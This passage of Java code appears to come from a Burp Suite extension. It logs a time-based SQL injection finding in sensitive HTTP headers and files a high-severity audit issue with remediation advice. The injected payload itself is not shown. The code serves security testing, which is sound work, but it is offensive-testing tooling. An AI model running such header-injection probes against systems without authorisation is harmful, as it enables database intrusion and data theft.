        api.logging().logToOutput("  • Response Time: " + responseTime + " ms");
        api.logging().logToOutput("  • Expected Sleep Time: " + sqliSleepTime + " seconds");
        api.logging().logToOutput("Detected: " + new java.util.Date());
        
        // Create proper audit issue using the original request with injected headers
        try {
            // Get markers for the SQL injection payload in request and response
            List<Marker> requestMarkers = getRequestMarkers(response.request(), sqliPayload);
            List<Marker> responseMarkers = getResponseMarkers(response, sqliPayload);
            
            // Add markers to the evidence
            HttpRequestResponse markedEvidence = response;
            if (!requestMarkers.isEmpty()) {
                markedEvidence = markedEvidence.withRequestMarkers(requestMarkers);
            }
            if (!responseMarkers.isEmpty()) {
                markedEvidence = markedEvidence.withResponseMarkers(responseMarkers);
            }
            
            AuditIssue issue = AuditIssue.auditIssue(
                "Time-based SQL Injection via Sensitive Headers",
                "Time-based SQL injection vulnerability detected through sensitive header injection. The application "
                + "responded with a delay of " + responseTime + " ms, which suggests that the injected "
                + "time-based SQL payload was executed. This indicates that user input from sensitive headers is being "
                + "directly incorporated into SQL queries without proper sanitization. "
                + "Payload: " + sqliPayload,
                "Fix this vulnerability by properly validating and sanitizing all user input, especially in HTTP headers. "
                + "Implement proper input validation and use parameterized queries to prevent SQL injection attacks.",
                response.request().url(),
                AuditIssueSeverity.HIGH,
                AuditIssueConfidence.FIRM,
                "This vulnerability allows attackers to execute arbitrary SQL commands on the database server, "
                + "potentially leading to data theft, data manipulation, or complete system compromise.",
                "The application processes user-controlled header values without proper validation or sanitization, "
                + "allowing SQL injection attacks through HTTP header injection.",
                AuditIssueSeverity.HIGH,
                markedEvidence
            );
            
            api.siteMap().add(issue);
            api.logging().logToOutput("Audit issue created successfully: Time-based SQL Injection via Sensitive Headers");
        } catch (Exception e) {
            api.logging().logToError("Failed to create SQL injection audit issue: " + e.getMessage());
        }
        
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
    }

}

